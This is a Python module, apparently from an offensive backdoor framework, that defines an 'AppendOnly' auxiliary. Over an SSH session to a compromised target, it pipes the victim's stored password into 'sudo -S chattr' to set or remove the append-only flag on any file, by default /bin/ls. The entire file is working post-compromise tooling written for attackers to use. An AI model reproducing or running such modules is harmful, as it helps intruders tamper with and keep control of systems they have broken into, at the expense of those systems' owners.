from backdoor import *

class AppendOnly(Backdoor):
    prompt = Fore.RED + "(AppendOnly) " + Fore.BLUE + ">> " + Fore.RESET 
    def __init__(self, core):
        cmd.Cmd.__init__(self)

        self.core = core
        self.intro = GOOD + "Using append auxiliary..."
        self.options = {
                "file": Option("file", "/bin/ls", "file to make append only", False),
                "function" : Option("function", "add", "add or remove append only flag", False)
                }
        self.help_text = INFO + "Sets (or removes) the append-only flag for any file on the system." 
        self.allow_modules = False
        self.modules = {}

    def do_exploit(self, args):
        if self.get_value("function") == "remove":
            self.core.curtarget.ssh.exec_command("echo " + self.core.curtarget.pword + " | sudo -S chattr -a " + self.get_value("file"))
        else:
            self.core.curtarget.ssh.exec_command("echo " + self.core.curtarget.pword + " | sudo -S chattr +a " + self.get_value("file"))
        print(GOOD + "AppendOnly module executed.")
